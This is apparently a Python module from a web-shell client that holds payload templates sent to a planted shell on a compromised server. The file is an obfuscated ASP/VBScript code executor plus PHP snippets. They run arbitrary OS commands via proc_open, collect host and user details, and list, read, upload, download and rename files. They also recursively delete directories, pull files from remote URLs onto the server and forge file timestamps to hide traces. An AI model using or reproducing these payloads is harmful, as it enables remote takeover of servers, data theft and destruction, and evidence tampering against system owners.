#!/usr/bin/env python
# -*- coding: UTF-8 -*-

# Authors: img
# Date: 2018-06-01

__author__ = "img"
__date__ = '2018/6/1'

encoding = "hex_encode"
is_urlencode = False
LeftDelimiter = ">>>"
RightDelimiter = "<<<"
BASE = '%%u0045%%xec%%ute%%G%%loba%%l%%%%28Replace%%28%%22Fu%%nct%%ion%%20bd%%28by%%V%%al%%20s%%29:Fo%%r%%20i%%%%3D1%%20T%%o%%20Le%%n%%28s%%29%%20S%%te%%p%%202:c%%%%3DM%%id%%28s%%2Ci%%2C2%%29:If%%20Is%%Nu%%meric%%28M%%id%%28s%%2Ci%%2C1%%29%%29%%20T%%hen:bd%%%%3Dbd%%4026%%40c%%hr%%28%%22%%22%%4026%%40H%%22%%22%%4026%%40c%%29:E%%lse:bd%%%%3Dbd%%4026%%40c%%hr%%28%%22%%22%%4026%%40H%%22%%22%%4026%%40c%%4026%%40M%%id%%28s%%2Ci%%2B2%%2C2%%29%%29:i%%%%3Di%%2B2:E%%nd%%20If:Ne%%xt:E%%nd%%20Fu%%nct%%ion:E%%xecu%%te%%%%28bd%%%%28%%22%%224F6E204572726F7220526573756D65204E6578743A526573706F6E73652E57726974652022%s223A%s3A526573706F6E73652E57726974652022%s223A526573706F6E73652E456E64%%22%%22%%29%%%%29%%22%%2C%%22%%4026%%40%%22%%2Cchr%%2838%%29%%29%%29'
SHELL = r"""$m=get_magic_quotes_gpc();$p='%s';$ab='%s';$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \"{$ab}\"":"/c \"{$ab}\"";$r="{$p} {$c}";$array=array(array("pipe","r"),array("pipe","w"),array("pipe","w"));$fp=proc_open($r." 2>&1",$array,$pipes);$ret=stream_get_contents($pipes[1]);proc_close($fp);print """ + """"%s".$ret."%s";""" % (
    LeftDelimiter, RightDelimiter)
BASE_INFO = """$D=dirname(__FILE__);$R="{$D}\t";if(substr($D,0,1)!="/"){foreach(range("A","Z") as $L)if(is_dir("{$L}:"))$R.="{$L}:";}$R.="\t";$u=(function_exists('posix_getegid'))?@posix_getpwuid(@posix_geteuid()):'';$usr=($u)?$u['name']:@get_current_user();$R.=php_uname();$R.="({$usr})";print "%s".$R."%s";""" % (
    LeftDelimiter, RightDelimiter)
SHOW_FOLDER = """$D='%s';$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.'/'.$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R="\t".$T."\t".@filesize($P)."\t".$E."\n";if(@is_dir($P))$M.="T\t".$P.$R;else $L.="F\t".$P.$R;}echo """ + """ "%s".$M.$L."%s";@closedir($F);}""" % (
    LeftDelimiter, RightDelimiter)
READ_FILE = """$F='%s';$P=@fopen($F,'r');echo "{0}";echo(@fread($P,filesize($F)));echo "{1}";@fclose($P);""".format(
    LeftDelimiter, RightDelimiter)
UPLOAD_FILE = """$f='%s';$c=$_POST["file"];echo ">>>";echo(@fwrite(fopen($f,'w'),gzuncompress(base64_decode($c)))?'1':'0');echo "<<<";"""
WGET_FILE = """$fR='%s';$fL='%s';$F=@fopen($fR,chr(114));$L=@fopen($fL,chr(119));if($F && $L){while(!feof($F))@fwrite($L,@fgetc($F));@fclose($F);@fclose($L);echo(">>>1<<<");}else{echo(">>>0<<<");}"""
DOWNLOAD_FILE = """$F="%s";$fp=@fopen($F,'r');if(@fgetc($fp)){@fclose($fp);@readfile($F);}else{echo('ERROR:// Can Not Read');}"""
RENAME = """$src='%s';$dst='%s';echo ">>>";echo rename($src,$dst)?'1':'0';echo "<<<";"""
DELETE = """$F='%s';function df($p){$m=@dir($p);while(@$f=$m->read()){$pf=$p."/".$f;if((is_dir($pf))&&($f!=".")&&($f!="..")){@chmod($pf,0777);df($pf);}if(is_file($pf)){@chmod($pf,0777);@unlink($pf);}}$m->close();@chmod($p,0777);return @rmdir($p);}if(is_dir($F))echo(df($F));else{echo(file_exists($F)?@unlink($F)?">>>1<<<":">>>0<<<":">>>0<<<");}"""
NEW_FOLDER = """$f='%s';echo(mkdir($f)?">>>1<<<":">>>0<<<");"""
SET_TIME = """$FN='%s';$TM=strtotime('%s');if(file_exists($FN)){echo(@touch($FN,$TM,$TM)?'1':'0');}else{echo '0';};"""
